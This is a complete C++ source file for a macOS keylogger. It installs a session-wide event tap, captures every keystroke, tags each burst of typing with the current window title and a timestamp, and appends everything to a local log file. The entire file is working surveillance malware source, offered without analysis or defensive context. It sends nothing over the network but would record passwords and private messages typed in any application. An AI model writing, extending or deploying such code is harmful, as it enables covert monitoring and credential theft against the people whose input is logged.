#include <iostream>
#include <fstream>
#include <ApplicationServices/ApplicationServices.h>
#include <ctime>
#include <string>
#include <Carbon/Carbon.h> // Add this include for keycode constants

using namespace std;

string prevWindow = "";
string currWindow = "";

string getActiveWindowTitle()
{
    CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID);
    CFDictionaryRef windowInfo;
    string title = "Unknown";

    for (int i = 0; i < CFArrayGetCount(windowList); i++)
    {
        windowInfo = (CFDictionaryRef)CFArrayGetValueAtIndex(windowList, i);
        CFStringRef windowName = (CFStringRef)CFDictionaryGetValue(windowInfo, kCGWindowName);
        if (windowName)
        {
            char buffer[256];
            CFStringGetCString(windowName, buffer, sizeof(buffer), kCFStringEncodingUTF8);
            title = string(buffer);
            break;
        }
    }
    CFRelease(windowList);
    return title;
}

void logger(CGEventRef event, ofstream &logfile)
{
    currWindow = getActiveWindowTitle();

    if (currWindow != prevWindow)
    {
        time_t current_time = time(NULL);
        char *dt = ctime(&current_time);
        logfile << "\n\n"
                << currWindow << "\t\t" << dt;
        prevWindow = currWindow;
    }

    CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    switch (keycode)
    {
    case kVK_Shift:
        logfile << "[SHIFT]";
        break;
    case kVK_Return:
        logfile << "[RETURN]";
        break;
    case kVK_Delete:
        logfile << "[DELETE]";
        break;
    case kVK_Escape:
        logfile << "[ESCAPE]";
        break;
    case kVK_Control:
        logfile << "[CTRL]";
        break;
    case kVK_CapsLock:
        logfile << "[CAPS_LOCK]";
        break;
    case kVK_Option:
        logfile << "[ALT]";
        break;
    case kVK_Command:
        logfile << "[CMD]";
        break;
    case kVK_Tab:
        logfile << "[TAB]";
        break;
    case kVK_Space:
        logfile << "[SPACE]";
        break;
    case kVK_LeftArrow:
        logfile << "[LEFT_ARROW]";
        break;
    case kVK_RightArrow:
        logfile << "[RIGHT_ARROW]";
        break;
    case kVK_UpArrow:
        logfile << "[UP_ARROW]";
        break;
    case kVK_DownArrow:
        logfile << "[DOWN_ARROW]";
        break;
    default:
    {
        UniChar unicodeString[4];
        UniCharCount actualStringLength;
        CGEventKeyboardGetUnicodeString(event, 4, &actualStringLength, unicodeString);
        if (actualStringLength > 0)
        {
            logfile << string((char *)unicodeString, actualStringLength);
        }
    }
    break;
    }

    logfile.flush();
}

ofstream logfile;

CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
{
    ofstream *logfile = (ofstream *)refcon;
    if (type == kCGEventKeyDown)
    {
        logger(event, *logfile);
    }
    return event;
}

int main()
{
    // Define the event mask to capture key down events
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

    logfile.open("log.txt", ios::out | ios::app);
    if (!logfile.is_open())
    {
        cerr << "Unable to open log file" << endl;
        return 1;
    }

    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault, eventMask, CGEventCallback, &logfile);
    if (!eventTap)
    {
        cerr << "Unable to create event tap" << endl;
        return 1;
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    CFRunLoopRun();

    logfile.close();
    return 0;
}